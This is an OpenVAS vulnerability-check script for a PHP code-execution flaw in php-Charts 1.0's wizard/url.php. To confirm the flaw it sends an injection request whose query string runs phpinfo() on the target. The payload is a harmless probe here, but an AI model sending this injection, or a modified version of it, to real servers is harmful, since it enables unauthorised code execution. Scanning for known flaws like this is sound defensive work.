###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_charts_57448.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# php-Charts 'url.php' Arbitrary PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103644");
  script_bugtraq_id(57448);
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_name("php-Charts 'url.php' Arbitrary PHP Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57448");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-01-21 13:23:53 +0100 (Mon, 21 Jan 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"php-Charts is prone to an arbitrary PHP code-execution vulnerability.

 An attacker can exploit this issue to execute arbitrary PHP code
 within the context of the web server.

php-Charts 1.0 is vulnerable. Other versions may also be affected.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/charts", "/php-charts", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + '/wizard/url.php?${phpinfo()}=1';

  if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
